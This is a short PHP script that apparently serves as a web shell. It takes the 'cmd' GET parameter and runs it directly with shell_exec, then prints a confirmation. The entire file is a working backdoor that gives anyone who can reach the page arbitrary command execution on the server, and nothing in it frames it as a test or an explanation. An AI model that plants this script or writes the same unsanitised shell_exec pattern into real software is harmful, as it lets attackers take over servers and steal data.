<?php
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	shell_exec($cmd);
	echo "Command '" . $cmd . "' execution done.";
}
?>